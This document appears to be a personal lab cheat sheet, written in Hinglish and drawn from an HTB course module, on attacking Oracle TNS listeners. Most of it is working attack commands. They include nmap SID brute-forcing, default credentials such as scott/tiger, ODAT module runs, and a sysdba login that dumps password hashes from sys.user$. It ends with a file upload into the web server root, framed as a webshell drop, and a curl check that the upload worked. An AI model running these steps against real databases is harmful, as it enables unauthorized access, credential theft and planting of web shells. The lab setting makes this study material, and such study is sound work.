# Oracle TNS

## What is it?
Oracle TNS (Transparent Network Substrate) = communication protocol, Oracle databases aur applications ke beech.
TCP/IP, IPX/SPX support karta hai. Built-in encryption — healthcare/finance/retail mein popular.
Purpose: Name resolution, Connection management, Load balancing, Security.

## When to use?
Port 1521 open mile toh (default TNS listener port).
SID guess/brute-force karo — connection ke liye zaroori hai.
Default credentials try karo — Oracle services mein bahut common.

## Key Config Files
| File | Location | Purpose |
|------|----------|---------|
| tnsnames.ora | $ORACLE_HOME/network/admin | Client-side — service name → network address mapping |
| listener.ora | $ORACLE_HOME/network/admin | Server-side — listener process config |

## Default Credentials to Remember
| Service/Version | Default Password |
|------------------|-------------------|
| Oracle 9 | CHANGE_ON_INSTALL |
| Oracle 10/11 | No default password |
| Oracle DBSNMP | dbsnmp |
| scott (common test user) | tiger |

## Commands

# Setup ODAT tool (one time)
sudo apt-get update
sudo apt-get install -y build-essential python3-dev libaio1
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update

# Nmap — basic TNS scan
sudo nmap -p1521 -sV 10.129.204.235 --open

# Nmap — SID brute force
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

# ODAT — try all modules (creds, vulns, misconfigs)
./odat.py all -s 10.129.204.235

# Setup sqlplus (one time)
sudo apt install oracle-instantclient-sqlplus

# sqlplus — login with found creds
sqlplus scott/tiger@10.129.204.235/XE

# sqlplus — login as sysdba (higher privileges)
sqlplus scott/tiger@10.129.204.235/XE as sysdba

# Inside SQL shell — list tables
SQL> select table_name from all_tables;

# Inside SQL shell — check current user privileges
SQL> select * from user_role_privs;

# Extract password hashes (needs sysdba access)
SQL> select name, password from sys.user$;

# File upload via ODAT (webshell drop)
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

# Verify upload worked
curl -X GET http://10.129.204.235/testing.txt

## Key Concepts
| Term | Meaning |
|------|---------|
| SID | System Identifier — unique database instance name, connection ke liye zaroori |
| Listener | Incoming connections accept karta hai, port 1521 pe |
| sysdba | Highest privilege role — password hash dump possible |
| ODAT | Oracle Database Attacking Tool — enum + exploit dono |

## Default Web Root Paths (for file upload/webshell)
| OS | Path |
|----|------|
| Linux | /var/www/html |
| Windows | C:\inetpub\wwwroot |

## My Lab Notes
- SID galat diya toh connection fail ho jaata hai — pehle brute-force karo
- ODAT `all` module bahut kuch try karta hai — valid creds mil sakte hain (scott/tiger jaisa common)
- sysdba access mile toh password hashes extract karo — offline crack karo
- Web server root path pata ho toh testing.txt jaisi harmless file upload karo pehle — AV/IDS test
- Successful upload confirm karne ke liye curl se access karo file ko

## References
- HTB Module: Footprinting — Oracle TNS Section
- ODAT: https://github.com/quentinhardy/odat

## MITRE
T1046 - Network Service Discovery
T1078 - Valid Accounts
T1552 - Unsecured Credentials
T1105 - Ingress Tool Transfer (file upload)
T1190 - Exploit Public-Facing Application
